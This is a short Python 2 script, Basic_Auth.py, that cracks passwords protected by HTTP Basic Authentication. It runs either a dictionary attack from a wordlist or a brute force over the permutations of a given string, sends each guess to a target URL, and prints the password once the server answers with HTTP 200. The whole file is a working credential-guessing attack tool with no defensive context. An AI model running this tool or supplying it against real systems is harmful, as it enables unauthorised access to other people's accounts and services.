import urllib2
import sys
import itertools
if len(sys.argv) < 2:
    print "\nBasic_Auth.py -d <url> <wordlist> <username>"
    print "Basic_Auth.py -p <url> <username> <string>\n"
    print "-d       -->>        Perform dictionary attack"
    print "-p       -->>        Perform bruteforce by possible combination of the letters in the given string\n"

pass_mg = urllib2.HTTPPasswordMgrWithDefaultRealm()
op = sys.argv[1]
if op == '-d':
    url = sys.argv[2]
    listpath = sys.argv[3]
    user = sys.argv[4]
    fd = open(listpath,'r')
    for ps in fd.readlines():
        password = ps.strip('\n')
        pass_mg.add_password(None, url, user, password)
        handler = urllib2.HTTPBasicAuthHandler(pass_mg)
        opener = urllib2.build_opener(handler)
        print password
        try:
            x = opener.open(url)
            if x.code == 200:
                print "\nBOOM - Your Password for username "+ user +" is : " + password
                break
        except:
            pass
    fd.close()

elif op == '-p':
    url = sys.argv[2]
    user = sys.argv[3]
    string = sys.argv[4]
    word_array = ["".join(x) for x in itertools.permutations(string)]
    dup_array = set(word_array) # removing duplicate entries.
    words = list(dup_array)
    for password in words:
        pass_mg.add_password(None, url, user, password)
        handler = urllib2.HTTPBasicAuthHandler(pass_mg)

        opener = urllib2.build_opener(handler)

        print password
    
        try:
            x = opener.open(url)
            if x.code == 200:
                print "\nYour Password for user "+ user + " is : " + password
                break
        except:
            pass
elif op == '-h':
    print "\nBasic_Auth.py -d <url> <wordlist> <username>"
    print "Basic_Auth.py -p <url> <username> <string>\n"
    print "-d       -->>        Perform dictionary attack"
    print "-p       -->>        Perform bruteforce by possible combination of the letters in the given string\n"
else:
    print "Syntex Error ... !!!"

    
